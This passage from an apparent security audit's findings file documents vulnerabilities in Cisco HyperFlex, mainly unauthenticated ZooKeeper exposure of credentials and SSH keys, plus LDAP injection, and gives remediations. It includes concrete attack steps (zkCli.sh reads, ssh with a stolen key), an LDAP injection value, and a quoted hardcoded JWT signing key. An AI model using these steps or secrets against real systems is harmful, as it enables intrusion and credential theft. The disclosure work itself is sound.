                "Decodes and decrypts: AES decrypt(encryptedCreds, Base64Decode(b64Key)) -> plaintext. "
                "Result: Hyper-V domain admin credentials in plaintext. "
                "Both reads require no authentication (default ZK ACL: world:anyone:cdrwa)."
            ),
            "zk_access_model": (
                "Default ZK ACL: world:anyone:cdrwa. "
                "Confirmed in HX-F95 evidence. ZK port 2181 open with no auth required."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Never store the AES key in the same data store as the ciphertext it protects. "
            "Derive the Hyper-V credential encryption key from a cluster-secret in "
            "/etc/hyperflex/secure/ (not ZK). "
            "Apply ZK Digest or SASL ACLs to the stSSOMgr namespace. "
            "Rotate Hyper-V credentials immediately if ZK was exposed."
        ),
    },
    "HX-F102": {
        "title": (
            "ZooKeeper Client Authentication Disabled by Default in HyperFlex — "
            "When Enabled, Auth Credential Incorporates Cluster UUID Derivable "
            "from Unauthenticated REST API"
        ),
        "severity": "HIGH",
        "cvss": "8.6",
        "cwe": "CWE-306",
        "component": (
            "hx-aaa / HxCuratorManager / createZkClient / isZKClientAuthEnabled / "
            "ZooKeeper.addAuthInfo / storfs.cfg useZKAuth"
        ),
        "class": "ZK Auth Disabled by Default — Root Cause of ZK-Based Exposure Chain (F95/F97/F98/F99/F100/F101)",
        "confirmed": True,
        "evidence": {
            "default_disabled": (
                "HxCuratorManager static initializer: USE_ZK_AUTH = 'useZKAuth'. "
                "isZKClientAuthEnabled() at offsets 97-138: "
                "reads storfs.cfg lines; filters lines starting with 'useZKAuth'; "
                "checks if value contains 'true'; returns orElse(Boolean.FALSE). "
                "Default: false when 'useZKAuth=true' is not present in storfs.cfg. "
                "createZkClient() at offset 64-67: if (!isZKClientAuthEnabled()) goto 161; "
                "offset 161: stores client and returns — no auth info added."
            ),
            "auth_scheme_when_enabled": (
                "createZkClient() when auth enabled (offsets 70-135): "
                "clusterUuid = getClusterUuid() -> Files.readAllLines('/etc/hyperflex/clusteruuid').get(0); "
                "clientId = config.getPropVal('sysmgmt.zkAuthClientId'); "
                "authToken = clientId + clusterUuid; "
                "ZooKeeper.addAuthInfo('UUID', authToken.getBytes(UTF_8)). "
                "Auth scheme: 'UUID' (non-standard; not SASL). "
                "Auth token: known config prefix + cluster UUID from /etc/hyperflex/clusteruuid. "
                "Cluster UUID is exposed via unauthenticated /rest/v1/cluster endpoint (HX-F96). "
                "An attacker who knows the clientId prefix and obtains the cluster UUID "
                "can authenticate to ZK even when auth is enabled."
            ),
            "root_cause_of_chain": (
                "This is the root architectural cause of: "
                "HX-F95 (ZK password sync), HX-F97 (STIG bypass), HX-F98 (nginx cert MITM), "
                "HX-F99 (password policy), HX-F100 (JWT key exposure), HX-F101 (Hyper-V creds). "
                "All depend on unauthenticated ZK access. "
                "Default install has ZK auth disabled."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Enable ZK authentication in all HyperFlex deployments: "
            "set 'useZKAuth=true' in /etc/hyperflex/storfs.cfg on all nodes. "
            "Replace the 'UUID' auth scheme with SASL/Kerberos or Digest with a strong, "
            "randomly-generated secret (not derivable from cluster UUID). "
            "Restrict ZK port 2181 to localhost or HyperFlex management VLAN via firewall. "
            "Set world:anyone:none ACL on all sensitive ZK paths as a defense-in-depth measure."
        ),
    },
    "HX-F103": {
        "title": (
            "ZkConnectionManager.setAuthToken() Uses Boolean.getBoolean(propertyValue) Instead of "
            "Boolean.parseBoolean(propertyValue) — ZooKeeper Client Authentication Permanently "
            "Disabled Regardless of storfs.cfg Configuration"
        ),
        "severity": "HIGH",
        "cvss": "8.6",
        "cwe": "CWE-303",
        "component": (
            "com.cisco.hxdp.zk.client.ZkConnectionManager / setAuthToken() / "
            "zkcluster service — ZK connection management"
        ),
        "evidence": {
            "wrong_api_call": (
                "setAuthToken() offset 6-16: "
                "getPropertyFromStorfsCfg('useZkAuth', 'false') -> String; "
                "Boolean.getBoolean(thatString) -> Z. "
                "Boolean.getBoolean(String name) reads a JVM system property by name, "
                "NOT the boolean value of the string. "
                "When storfs.cfg has useZkAuth=true, getPropertyFromStorfsCfg returns 'true'; "
                "Boolean.getBoolean('true') checks System.getProperty('true') — "
                "no such JVM property exists — returns false. "
                "Auth token is NEVER applied regardless of configuration."
            ),
            "correct_api": (
                "Fix requires Boolean.parseBoolean(propertyValue), which parses the string "
                "value directly: Boolean.parseBoolean('true') -> true. "
                "Boolean.getBoolean(name) is the wrong overload."
            ),
            "no_auth_in_local_manager": (
                "ZkLocalConnectionManager.getConnectedClient() at offset 66: "
                "CuratorFrameworkFactory.newClient('localhost:2181', retryPolicy). "
                "Uses newClient() (not builder()); no setAuthToken() call in connection sequence. "
                "Local ZK connections are always unauthenticated even if global auth were fixed."
            ),
            "skip_on_failure_config": (
                "setAuthToken() exception handler at offset 139: "
                "cfg.getBoolean('zkConfig.client.skipZkAuthOnFailure'). "
                "When skipZkAuthOnFailure=true (reference.conf default), auth failure is silently "
                "ignored and the unauthenticated client is used anyway. "
                "Defense in depth fails at two layers."
            ),
            "distinct_from_hx_f102": (
                "HX-F102 documents HxCuratorManager (gateway service) with orElse(Boolean.FALSE) default. "
                "HX-F103 documents ZkConnectionManager (zkcluster service) with Boolean.getBoolean() misuse — "
                "the configuration option is structurally inoperative, not merely defaulted off. "
                "Different component, different root cause, same net effect."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace Boolean.getBoolean(value) with Boolean.parseBoolean(value) in "
            "ZkConnectionManager.setAuthToken(). "
            "Rewrite ZkLocalConnectionManager.getConnectedClient() to use CuratorFrameworkFactory.builder() "
            "and apply setAuthToken() after connection. "
            "Set zkConfig.client.skipZkAuthOnFailure=false in reference.conf so auth failures surface. "
            "See HX-F102 for full ZK auth remediation guidance."
        ),
    },
    "HX-F104": {
        "title": (
            "ZKNodeService_StMgr Stores ESXi, vCenter, and UCSM Credentials in ZooKeeper as "
            "Encrypted Payload Entries — All Three Credential Sets Accessible via "
            "Unauthenticated ZK Read"
        ),
        "severity": "HIGH",
        "cvss": "8.8",
        "cwe": "CWE-522",
        "component": (
            "com.storvisor.sysmgmt.stMgr.ZKNodeService_StMgr / "
            "EsxAuthZKMgmtImpl / stMgr Thrift service — "
            "cluster credential management via ZooKeeper"
        ),
        "evidence": {
            "esx_credentials_in_zk": (
                "ZKNodeService_StMgr fields: "
                "STR_PAYLOAD_ENTRY_ESX_ENCRYPTED_USER, STR_PAYLOAD_ENTRY_ESX_ENCRYPTED_PASSWORD. "
                "ZK keys: 'user_name', 'password' in 'credentials' payload node. "
                "Written by EsxAuthZKMgmtImpl.updateAndSaveRandomEsxPasswordToZK() via "
                "ZKNodeService_StMgr.setEsxCredentials(username, password). "
                "Read by EsxAuthZKMgmtImpl.getEsxCredentialsFromZK() via "
                "ZKNodeService_StMgr.getEsxCredentials() -> getOptionalValue_String(ESX_ENCRYPTED_USER/PASS)."
            ),
            "vcenter_credentials_in_zk": (
                "ZKNodeService_StMgr fields: "
                "STR_PAYLOAD_ENTRY_URL_VCENTER_ENCRYPTED_USER, STR_PAYLOAD_ENTRY_URL_VCENTER_ENCRYPTED_PASSWORD. "
                "ZK key: 'vcuser'. vCenter SSO URL at ZK key 'opt_url_vcenter_sso'. "
                "Full vCenter management credential set stored in same unauthenticated ZK node."
            ),
            "ucsm_credentials_in_zk": (
                "ZKNodeService_StMgr fields: "
                "STR_PAYLOAD_ENTRY_UCSM_ENCRYPTED_USER, STR_PAYLOAD_ENTRY_UCSM_ENCRYPTED_PASSWORD. "
                "ZK keys: 'ucsmhost', 'ucsmuser', 'ucsmpwd'. "
                "UCSM host, username, and password co-located in the same ZK credentials payload."
            ),
            "encryption_caveat": (
                "All three credential sets use 'ENCRYPTED' prefix in field names — values are "
                "not plaintext in ZK. EsxAuthZKMgmtImpl.getEsxCredentialsFromZK() performs "
                "decryption after ZK read ('Failed to decrypt esx credential data' error path). "
                "Decryption key source unconfirmed from available bytecode. "
                "If decryption key follows HX-F101 pattern (key stored in same unauthenticated ZK), "
                "effective severity elevates to CRITICAL (ZK read -> key + ciphertext -> plaintext). "
                "If key derived from cluster UUID per HX-F96 pattern, UUID exposure (multiple "
                "unauthenticated sources) enables decryption."
            ),
            "hardcoded_esx_username": (
                "EsxAuthZKMgmtImpl constant pool offset 497: 'springpath'. "
                "Service account username 'springpath' is hardcoded for ESXi login across all "
                "HyperFlex deployments. Password is random and rotated, but fixed username "
                "enables targeted credential attacks on any HyperFlex ESXi node."
            ),
            "zk_access_prerequisite": (
                "ZK auth disabled by default (HX-F102) and structurally inoperative in "
                "ZkConnectionManager (HX-F103). "
                "ZK binds to cluster IP (HX-F95). "
                "Attacker on management VLAN: "
                "zkCli.sh -server <cluster-ip>:2181 get /storvisor/... -> "
                "encrypted ESXi + vCenter + UCSM credentials in one ZK read session."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Enable ZK authentication (HX-F102/F103 remediation). "
            "Isolate ZK port 2181 to localhost/management VLAN. "
            "Ensure ESXi/vCenter/UCSM credential encryption keys are never stored "
            "in the same unauthenticated ZK namespace as the ciphertext. "
            "Audit the decryption key storage path for all three credential types. "
            "Consider rotating all three credential sets after any ZK exposure incident."
        ),
    },
    "HX-F105": {
        "title": (
            "ZKQueryService_StNodeMgr.getStCtlSSHEncryptedPrivateKey() Reads "
            "STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY from ZooKeeper — "
            "stCtlVM SSH Private Key Stored and Retrieved in Cleartext via "
            "Unauthenticated ZK Read"
        ),
        "severity": "CRITICAL",
        "cvss": "9.1",
        "cwe": "CWE-312",
        "component": (
            "com.storvisor.sysmgmt.stNodeMgr.ZKQueryService_StNodeMgr / "
            "ZKNodeService_StNodeMgr / stNodeMgr service — "
            "stCtlVM SSH key management via ZooKeeper"
        ),
        "evidence": {
            "read_uses_plain_text_entry": (
                "ZKQueryService_StNodeMgr.getStCtlSSHEncryptedPrivateKey(hostname): "
                "offset 3: invokevirtual STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY:()String. "
                "Despite method name 'Encrypted', implementation reads "
                "STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY (ZK key: 'key') — the cleartext variant. "
                "Returns raw private key string from ZK without decryption."
            ),
            "write_path_plain_text": (
                "ZKNodeService_StNodeMgr.setSSHEncryptedPrivateKey(value, encrypted): "
                "encrypted=false branch (offset 14): getNodeEntry_SSHPlainTextPrivateKey(value) -> "
                "updateZKNodeEntry(). "
                "Default $default$2() -> true (encrypted=true is the default write path). "
                "Plain text path is explicitly written when encrypted=false is passed. "
                "getStCtlSSHEncryptedPrivateKey reads this plain text path in production."
            ),
            "dual_entry_structure": (
                "ZK contains two variants per stCtlVM host: "
                "STR_PAYLOAD_ENTRY_SSH_ENCRYPTED_PRIVATE_KEY (encrypted, default write), "
                "STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY (cleartext, read by production code). "
                "SSH public key mirrored: SSH_ENCRYPTED_PUBLIC_KEY and SSH_PLAIN_TEXT_PUBLIC_KEY. "
                "NonVMWStMgrImpl uses getStCtlSSHEncryptedPrivateKey() for SSH connection setup."
            ),
            "zk_access_prerequisite": (
                "ZK auth disabled by default (HX-F102/F103). "
                "Attack: zkCli.sh get /storvisor/stNodeMgr/<hostname>/... -> "
                "SSH private key in plaintext -> "
                "ssh -i key springpath@<stCtlVM-ip> -> full stCtlVM shell access."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Rename getStCtlSSHEncryptedPrivateKey to accurately reflect it reads plaintext. "
            "Store only encrypted SSH private keys in ZK; require decryption before use. "
            "Ensure setSSHEncryptedPrivateKey never uses encrypted=false in production code paths. "
            "Enable ZK auth (HX-F102/F103 remediation). "
            "Restrict ZK port 2181 to localhost/management VLAN. "
            "Rotate all stCtlVM SSH key pairs after any ZK exposure incident."
        ),
    },
    "HX-F106": {
        "title": (
            "StSSOMgrImpl Stores Symmetric Encryption Key and Encrypted Hyper-V Host Credentials "
            "Both in Unauthenticated ZooKeeper — Key Readable at zkAuthKey/zkEncryptionKey "
            "Enables Decryption of Hyper-V Host Credentials at zkAuthKey/zkCredsKey"
        ),
        "severity": "HIGH",
        "cvss": "8.8",
        "cwe": "CWE-522",
        "component": (
            "com.storvisor.sysmgmt.stSSOMgr.StSSOMgrImpl / getEncryptionKeyFromZK() / "
            "setHypervHostCreds() / getHypervHostCreds() — SSO Manager service"
        ),
        "evidence": {
            "key_in_zk": (
                "getEncryptionKeyFromZK() anonfun$1: "
                "ZkPersistenceManager.read(zkAuthKey, zkEncryptionKey) -> Optional[Base64String]. "
                "zkAuthKey from cfg 'sysmgmt.stSSOMgr.zkAuthKey'; "
                "zkEncryptionKey from cfg 'sysmgmt.stSSOMgr.zkEncryptionKey'. "
                "ZK node is unauthenticated (HX-F100, HX-F103). "
                "Key format: Base64.encodeBase64String(SecretKey.getEncoded()) -> stored as ZK node value."
            ),
            "auto_generate_and_write": (
                "getEncryptionKeyFromZK() anonfun$3 (error fallback): "
                "If ZK read fails, EncryptionUtil$.generateSecretKey() generates new key; "
                "Base64-encodes it; writes to ZkPersistenceManager.write(zkAuthKey, zkEncryptionKey, encodedKey, -1L). "
                "Self-keying: the encryption key is created and persisted to ZK autonomously, "
                "with no key management ceremony or HSM involvement."
            ),
            "encrypted_creds_also_in_zk": (
                "setHypervHostCreds() anonfun$3: "
                "After obtaining key via getEncryptionKeyFromZK(), encrypts credentials, "
                "writes to ZkPersistenceManager.write(zkAuthKey, zkCredsKey, encryptedCreds, version). "
                "zkCredsKey from cfg 'sysmgmt.stSSOMgr.zkCredsKey'. "
                "getHypervHostCreds(): reads ZkPersistenceManager.read(zkAuthKey, zkCredsKey) -> decrypts."
            ),
            "attack_path": (
                "ZK read at port 2181 (no auth, world:anyone:cdrwa). "
                "Step 1: read node <zkAuthKey>/<zkEncryptionKey> -> Base64 SecretKey. "
                "Step 2: read node <zkAuthKey>/<zkCredsKey> -> encrypted Hyper-V host creds. "
                "Step 3: Base64.decode(key), construct SecretKeySpec, decrypt creds. "
                "Result: plaintext Hyper-V hypervisor host credentials."
            ),
            "scope": (
                "Affects Hyper-V deployments of HyperFlex (non-VMware). "
                "Hyper-V host credentials are Windows local/domain admin credentials "
                "for the hypervisor nodes in the HyperFlex cluster. "
                "ESXi credential encryption path (EsxAuthZKMgmtImpl/ZKNodeService_StMgr) is separate; "
                "its encryption key source is unconfirmed — see HX-F104 encryption caveat."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Do not store the symmetric encryption key in the same unauthenticated ZK as the ciphertext. "
            "Use a key derivation path external to ZK (e.g., derived from a hardware secret, "
            "sealed by a TPM, or stored in a separate secret store). "
            "Enable ZK authentication (HX-F102/F103 remediation) as defense-in-depth. "
            "Restrict ZK port 2181 to localhost only. "
            "Rotate Hyper-V host credentials after any ZK exposure incident."
        ),
    },
    "HX-F107": {
        "title": (
            "LdapDriver.getAdUserPrincipal() Uses MessageFormat.format() Without LDAP Filter Escaping "
            "to Construct sAMAccountName Search Filter — LDAP Injection via Login Username"
        ),
        "severity": "HIGH",
        "cvss": "7.5",
        "cwe": "CWE-90",
        "component": (
            "com.springpath.hx.aaa.gateway.adAuthenticator.LdapDriver / getAdUserPrincipal() "
            "— Active Directory LDAP authentication gateway"
        ),
        "evidence": {
            "injection_site": (
                "getAdUserPrincipal() offset 37-53: "
                "MessageFormat.format('(&(objectCategory=user)(sAMAccountName={0}))', "
                "userContext.getUserAccountName()). "
                "No LDAP filter escaping applied to the username before substitution. "
                "LDAP metacharacters (*, (, ), \\, \\0) in the username are passed verbatim "
                "into the filter string."
            ),
            "correct_api": (
                "RFC 4515 requires special characters to be escaped before use in LDAP filters. "
                "The correct approach is LdapConnection.encodeFilterValue(username) or "
                "encodeForLDAP(username) before substitution. "
                "MessageFormat.format() performs no LDAP escaping."
            ),
            "bind_vs_search_paths": (
                "openLdapContext() at offset 64: LDAP bind uses getUserPrincipalName() (UPN form, user@domain). "
                "getAdUserPrincipal() at offset 46: LDAP search uses getUserAccountName() (sAMAccountName form). "
                "The bind and search inputs may derive from different parts of the username, "
                "allowing a valid bind with crafted sAMAccountName for the search filter."
            ),
            "impact": (
                "A domain user who authenticates successfully (LDAP bind with correct password) "
                "can supply a crafted sAMAccountName portion that manipulates the search filter. "
                "Filter injection can return a different user's directory object, "
                "yielding that user's DN and group memberships to the HyperFlex authorization layer. "
                "Example: sAMAccountName='*' -> filter '(&(objectCategory=user)(sAMAccountName=*)' "
                "returns the first AD object in enumeration order rather than the authenticated user. "
                "An attacker can obtain admin-group memberships of a HyperFlex admin user "
                "while authenticating with their own (non-admin) AD password."
            ),
            "second_filter": (
                "expandGroups() at constant pool #73: "
                "filter '(&(objectCategory=group)(cn={0}))' also uses MessageFormat.format(). "
                "Group CNs injected into this filter could enumerate arbitrary group objects."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace MessageFormat.format() with parameterized LDAP search using "
            "SearchControls and a properly escaped filter. "
            "Use OWASP ESAPI's Encoder.encodeForLDAP() or javax.naming attribute-level binding "
            "instead of building filter strings with user input. "
            "Apply the same fix to the group CN filter in expandGroups()."
        ),
    },
    "HX-F108": {
        "title": (
            "ZKService_StNodeMgr Stores SSH Private Key in Plaintext in Unauthenticated ZooKeeper — "
            "ZK Payload Entry 'ssh_plain_text_private_key' Readable by Any ZK Client on Port 2181"
        ),
        "severity": "HIGH",
        "cvss": "8.1",
        "cwe": "CWE-312",
        "component": (
            "com.storvisor.sysmgmt.stNodeMgr.ZKService_StNodeMgr (Scala interface) / "
            "STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY / getNodeEntry_SSHPlainTextPrivateKey() "
            "— StNodeMgr ZK key registry for inter-node SSH credentials"
        ),
        "evidence": {
            "plaintext_key_constant": (
                "ZKService_StNodeMgr.$init$() at offsets 17-19: "
                "ldc 'ssh_plain_text_private_key' -> "
                "_setter_$STR_PAYLOAD_ENTRY_SSH_PLAIN_TEXT_PRIVATE_KEY_$eq(). "
                "The ZK payload entry key for the plaintext SSH private key is 'ssh_plain_text_private_key'. "
                "This is stored under the per-node ZK payload path (nodeId-scoped ZKNodeEntry). "
                "Readable via ZK getData on the node's payload ZK path, "
                "no authentication required (ZK ACL world:anyone:cdrwa — HX-F100)."
            ),
            "dual_representation": (
                "ZKService_StNodeMgr exposes two parallel representations for SSH private keys: "
                "1) 'ssh_encrypted_private_key' via getNodeEntry_SSHEncryptedPrivateKey() "
                "2) 'ssh_plain_text_private_key' via getNodeEntry_SSHPlainTextPrivateKey(). "
                "The plaintext variant is a design choice, not a fallback. "
                "Both entries are registered in $init$ and are live ZK entries. "
                "Analogous plaintext/encrypted pairs exist for the public key: "
                "'ssh_plain_text_public_key' and 'ssh_encrypted_public_key'."
            ),
            "zk_acl_context": (
                "ZooKeeper instance at port 2181 has world:anyone:cdrwa ACL by default (HX-F100). "
                "No authentication is required to read any ZK node. "
                "An attacker on the management network with TCP access to port 2181 can "
                "enumerate all per-node ZK payload paths and extract the plaintext SSH private key "
                "for any cluster node. "
                "Typical ZK path pattern: <CLUSTER_ROOT>/nodes/<nodeId>/payload."
            ),
            "impact": (
                "Plaintext SSH private key for HyperFlex cluster nodes readable from unauthenticated ZK. "
                "These are the SSH keys used for inter-node management communication (stNodeMgr layer). "
                "An attacker obtaining a node's SSH private key can authenticate as that node "
                "to other cluster members, enabling lateral movement across all HyperFlex nodes "
                "without cluster credentials. "
                "Combined with ZK write access (world:anyone:cdrwa), attacker can also "
                "overwrite SSH keys to inject attacker-controlled keys for persistent access."
            ),
        },
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove 'ssh_plain_text_private_key' ZK entries entirely. "
            "If plaintext keys are required transiently, delete the ZK node immediately after consumption. "
            "Only store SSH keys in the encrypted representation ('ssh_encrypted_private_key'). "
            "Enable ZK authentication (HX-F102/F103 remediation) to require credentials for ZK reads. "
            "Restrict ZK port 2181 to localhost-only or cluster-internal network segment. "
            "Rotate all cluster SSH keys after any ZK exposure incident."
        ),
    },
    "HX-F109": {
        "title": (
            "Cross-Version: Hardcoded JWT Signing Key and Mock Dev Mode Present in HXDP 5.5.2b "
            "— HX-F17 and HX-F36 Predate 6.0.2b by at Least One Major Release"
        ),
        "severity": "HIGH",
        "cvss": "8.8",
        "cwe": "CWE-321",
        "component": (
            "auth_x86_64.deb (HXDP 5.5.2b-43453) / "
            "5.5.2b auth binary at /opt/springpath/auth/auth (Go, ELF64, not stripped, "
            "BuildID 5hwbBsBuASqHskl20qO4)"
        ),
        "evidence": {
            "jwt_key_in_552b": (
                "String 'RHGocmgN90R4ShL_WnQ5GJSgGzADV678' confirmed present in 5.5.2b auth "
                "binary via strings(1) — identical to the key in 6.0.2b (HX-F36). "
                "The key is embedded in the Go string literal table between runtime error strings "
                "in both versions."
            ),
            "jwt_library_552b": (
                "5.5.2b auth binary imports github.com/dgrijalva/jwt-go/v4 v4.0.0-preview1 "
                "(confirmed via embedded module metadata: "
                "'dep github.com/dgrijalva/jwt-go/v4 v4.0.0-preview1 h1:CaO/...'). "
                "Same library version as 6.0.2b. CVE-2020-26160 (audience bypass) "
                "and alg:none path (main.signingMethodNone, main.unsafeNoneMagicConstant) "
                "present in both versions."
            ),
            "mock_dev_mode_552b": (
                "main.isMockDevMode present in 5.5.2b auth binary symbol table "
                "(confirmed via strings/nm). Same dev bypass path in both 5.5.2b and 6.0.2b."
            ),
            "build_date": "5.5.2b auth binary mtime: Aug 17 2021 (built ~2021)",
            "install_path_552b": "/opt/springpath/auth/auth (5.5.2b) vs /opt/hyperflex/auth/auth (6.0.2b)",
            "affected_range": "HXDP 5.5.2b-43453 through 6.0.2b-44423 confirmed; likely earlier",
        },
        "versions_affected": ["5.5.2b-43453", "6.0.2b-44423"],
        "remediation": "See HX-F17 and HX-F36 remediation. Applies to all versions in affected range.",
    },
    "HX-F110": {
        "title": (
            "Cross-Version: Springpath-to-HyperFlex Path Rebranding — CHAP/ZK Credential "
            "Architecture Predates HXDP 5.5.2b; HX-F11/F12/F23 Are Springpath-Era Design Decisions"
        ),
        "severity": "HIGH",
        "cvss": "8.1",
        "cwe": "CWE-312",
        "component": (
            "hx-iscsi_5.5.2b-43453_x86_64.deb / iscsisvc (BuildID sha1=5371897e) + "
            "auth_x86_64.deb 5.5.2b / /etc/springpath/secure/"
        ),
        "evidence": {
            "path_matrix": {
                "5.5.2b_keystore": "/etc/springpath/secure/springpath_keystore.p12",
                "6.0.2b_keystore": "/etc/hyperflex/secure/hyperflex_keystore.p12",
                "5.5.2b_properties": "/etc/springpath/secure/springpath_security.properties",
                "6.0.2b_properties": "/etc/hyperflex/secure/hyperflex_security.properties",
                "5.5.2b_clusteruuid": "/etc/springpath/clusteruuid",
                "6.0.2b_clusteruuid": "/etc/hyperflex/clusteruuid",
                "5.5.2b_auth_path": "/opt/springpath/auth/auth",
                "6.0.2b_auth_path": "/opt/hyperflex/auth/auth",
                "5.5.2b_tmppath": "/var/log/springpath (auth conf.json TmpPath)",
            },
            "springpath_literal_in_552b": (
                "String 'springpath' confirmed in 5.5.2b iscsisvc binary "
                "(the hardcoded keystore password — HX-F12). "
                "Adjacent strings at file offset 0xae381d confirm path context: "
                "'.hx_read_chap_json_str.../etc/springpath/secure/springpath_security.properties'"
            ),
            "architectural_continuity": (
                "Same CHAP credential decryption architecture in both versions: "
                "hx_read_chap_json_str (5.5.2b) / decrypt_data+get_keystore_passwd (6.0.2b) "
                "both read PKCS12 keystore using the 'springpath' password, "
                "decrypt ZK-stored RSA ciphertexts for CHAP credentials. "
                "Only path prefix changed (springpath→hyperflex); crypto approach unchanged."
            ),
            "chap_functions_552b": [
                "hx_get_chap_key_path (0x36ed60)",
                "hx_read_chap_json_str (symbol table confirmed)",
                "hx_istgt_get_chap_authinfo (0x36f130)",
                "chap_decrypt_init (0x36fde0)",
                "chap_decrypt_cleanup (0x36ff70)",
                "decrypt_data (0x370090)",
                "get_keystore_passwd (0x36fb00)",
            ],
            "origin": (
                "Cisco acquired Springpath in 2017. The 'springpath' password and "
                "/etc/springpath/ path hierarchy are Springpath-era design decisions "
                "inherited across all HyperFlex releases. The 6.0.2b rebrand to 'hyperflex' "
                "paths changed filenames but not the cryptographic architecture or password."
            ),
        },
        "versions_affected": ["5.5.2b-43453", "6.0.2b-44423", "all intermediate releases"],
        "remediation": "See HX-F11, HX-F12, HX-F23 remediations. Applies to entire HXDP release history.",
    },
    "HX-F111": {
        "title": (
            "HXDP 5.5.2b Ships CiscoSSL 1.0.2u (EOL December 2019) as System libssl "
            "— SSH FIPS Mode Disabled via Inline sed Workaround in post_install.sh"
        ),
        "severity": "HIGH",
        "cvss": "7.5",
        "cwe": "CWE-1104",
        "component": (
            "cisco-openssl_1.0.2u_x86_64.deb (HXDP 5.5.2b) / "
            "/lib/x86_64-linux-gnu/libssl.so.1.0.0 + libcrypto.so.1.0.0 + /usr/sbin/sshd"
        ),
        "evidence": {
            "version_matrix": {
                "5.5.2b": "CiscoSSL 1.0.2u (OpenSSL 1.0.2u base) — EOL 2019-12-31",
                "6.0.2b": "CiscoSSL 1.1.1za.7.2.587 (OpenSSL 1.1.1 base) — EOL 2023-09-11",
            },
            "library_files_552b": [
                "libssl.so.1.0.0 (replaces system)",
                "libcrypto.so.1.0.0 (replaces system)",
                "sshd (replaces /usr/sbin/sshd)",
            ],
            "fips_disable_workaround": (
                "5.5.2b post_install.sh line: "
                "\"sed -i 's/^CiscoSSHFipsMode/#CiscoSSHFipsMode/g' /etc/ssh/sshd_config\" "
                "Comment: 'Temporary workaround until we move to ecdsa key that works for "
                "CVM, host, CCP'. "
                "In 6.0.2b: CiscoSSHFipsMode yes (enabled, workaround removed). "
                "FIPS mode was disabled on all 5.5.2b stCtlVMs by the installer."
            ),
            "gost_engine_comment": (
                "post_install.sh comment: 'This is being done because the gost engine did not "
                "get included in the openssl.cnf during ciscossl 1.0.2o build.' "
                "Confirms the 1.0.2 lineage was maintained through at least 1.0.2o → 1.0.2u "
                "with known build issues."
            ),
            "eol_lag": (
                "OpenSSL 1.0.2u shipped in 5.5.2b (build date April 2025) — "
                "5+ years after the 2019 EOL date. "
                "Upgrade to 1.1.1 in 6.0.2b still insufficient (1.1.1 EOL Sept 2023 — "
                "now also EOL at time of 6.0.2b release)."
            ),
            "install_mechanism": (
                "Same backupAndCopy() pattern as 6.0.2b: moves original lib to orig.libssl.so.1.0.0 "
                "before replacing with Cisco private build. Original not recoverable post-install "
                "without the backup file."
            ),
        },
        "versions_affected": ["5.5.2b-43453 and earlier"],
        "remediation": (
            "Upgrade to 6.0.2b or later which uses CiscoSSL 1.1.1za. "
            "Long-term: migrate to OpenSSL 3.x before 1.1.1 private patches cease. "
            "Audit all stCtlVMs running 5.5.2b for CiscoSSHFipsMode=disabled state "
            "post-upgrade from 5.5.2b."
        ),
    },
    "HX-F112": {
        "title": (
            "5.5.2b iscsisvc Exposes Explicit hx_get_chap_key_path Function — "
            "CHAP Credential File Path Derivation Refactored but Architecture Preserved in 6.0.2b"
        ),
        "severity": "MEDIUM",
        "cvss": "5.3",
        "cwe": "CWE-312",
        "component": (
            "hx-iscsi_5.5.2b-43453_x86_64.deb / iscsisvc (not stripped); "
            "function hx_get_chap_key_path at 0x36ed60"
        ),
        "evidence": {
            "552b_function_names": {
                "hx_get_chap_key_path":     "0x36ed60 — derives filesystem path for CHAP key file",
                "hx_read_chap_json_str":    "symbol — reads CHAP credential JSON string",
                "hx_istgt_get_chap_authinfo": "0x36f130 — assembles authinfo from ZK JSON + keystore",
                "chap_decrypt_init":        "0x36fde0",
                "chap_decrypt_cleanup":     "0x36ff70",
                "decrypt_data":             "0x370090",
                "get_keystore_passwd":      "0x36fb00",
            },
            "602b_function_names": {
                "chap_decrypt_init":    "0x28ba30",
                "chap_decrypt_cleanup": "symbol",
                "decrypt_data":         "0x28bcf0",
                "get_keystore_passwd":  "0x28b7e0",
            },
            "architectural_delta": (
                "5.5.2b names the CHAP path derivation explicitly (hx_get_chap_key_path), "
                "confirming CHAP credentials stored at a filesystem path per-initiator "
                "in addition to ZK. "
                "6.0.2b refactored the CHAP path derivation into the decrypt_data flow, "
                "removing the explicit function but preserving the same ZK+PKCS12 architecture "
                "(HX-F11: ZK at /chap/<initiator-iqn>, decrypt via springpath keystore). "
                "The refactoring obscured but did not fix the vulnerability."
            ),
            "zk_path_confirmed_552b": (
                "String '/chap/%s' present in 5.5.2b iscsisvc — "
                "ZK path for CHAP credentials identical across versions."
            ),
            "identity_map_552b": (
                "5.5.2b iscsisvc LOAD segments: "
                "LOAD1 offset=0x0 vaddr=0x0 filesz=0xd74a70 (identity-mapped), "
                "LOAD2 offset=0xd75380 vaddr=0xf75380. "
                "Same identity-map pattern as 6.0.2b for direct file-offset→VA translation."
            ),
        },
        "versions_affected": ["5.5.2b-43453 (explicit path fn)", "6.0.2b-44423 (refactored)"],
        "remediation": "See HX-F11 remediation — CHAP credential decryption architecture unchanged.",
    },
    "HX-F113": {
        "title": (
            "VC Plugin ThumbprintTrustManager Unconditionally Trusts All TLS Certificates "
            "— add-then-contains Logic Bug Makes checkServerTrusted a No-Op"
        ),
        "severity": "HIGH",
        "cvss": "7.4",
        "cwe": "CWE-295",
        "component": (
            "HyperFlex-VC-HTML-Plugin-2.2.0.zip / ciscohx-service.jar / "
            "com.ciscohx.vcplugin.service.utils.ssl.ThumbprintTrustManager"
        ),
        "evidence": {
            "broken_check_logic": (
                "ThumbprintTrustManager.checkThumbprint(X509Certificate): "
